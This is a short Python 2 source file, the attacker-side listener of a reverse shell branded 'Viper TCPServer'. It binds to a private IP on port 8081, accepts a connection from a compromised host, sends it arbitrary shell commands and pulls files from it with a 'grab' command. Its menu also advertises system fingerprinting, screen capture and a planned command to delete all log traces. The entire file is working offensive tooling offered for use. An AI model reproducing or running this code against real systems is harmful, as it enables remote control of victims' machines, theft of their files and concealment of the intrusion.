#!/usr/bin/python

import socket
import os


"""This is python reverse shell that grabs files or information and reports back to the server!"""


def banner():
    print """

    Name : Viper TCPServer by Black Signals
    Date : 03 March 17
    Version : v1.0

#   __   _____ ___ ___ ___   
#   \ \ / /_ _| _ \ __| _ \  #
#    \ V / | ||  _/ _||   /  #
#     \_/ |___|_| |___|_|_\  #
#                            
                    Going low and slow
"""

def menu():
    """This is the program menu"""
    print "[*] Command options: "
    print
    print "[*] grab*<filename> ========= > grabs the file and saves it to the local desktop as .txt" #DONE
    print "[*] getenv       ========= >  prints the system information" #Works
    print "[*] getuid       ========= > Get the user level access of the shell" #works
    print "[*] SystemInfo   ========= > Get Fingerprint of the system" #TODO
    print "[*] capture      ========= > take images of the host machine " #Working on this
    print "[*] Cover        ========= > Delete all traces of logs" #TODO
    print "\n"




def transfer(conn,command):
    conn.send(command)
    f = open('/root/Desktop/test.py','wb')
    while True:
        bits = conn.recv(1024)
        if 'Unable to find out the file' in bits:
            print '[-] Unable to find out the file'
            break
        if bits.endswith('DONE'):
            print '[+] Transfer completed '
            f.close()
            break
        f.write(bits)
    f.close()



def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("10.11.0.202", 8081)) #modify this line here to whatever you want
    s.listen(1)
    print '[+] listening for incoming TCP connection on port 8081'
    conn, addr = s.accept()
    print '[+] We got a connection from: ',addr



    while True:
        command = raw_input("$ ViperShell>> ")

        if 'terminate' in command:
            conn.send('terminate')
            conn.close() #close the connection with host
            break
        
        elif 'grab' in command:
            #usage shell > grab*file
            transfer(conn,command)
        else:
            conn.send(command) #send command
            print conn.recv(1024)



def main():
	banner()
	menu()
	connect()

if __name__ == "__main__":
	main()
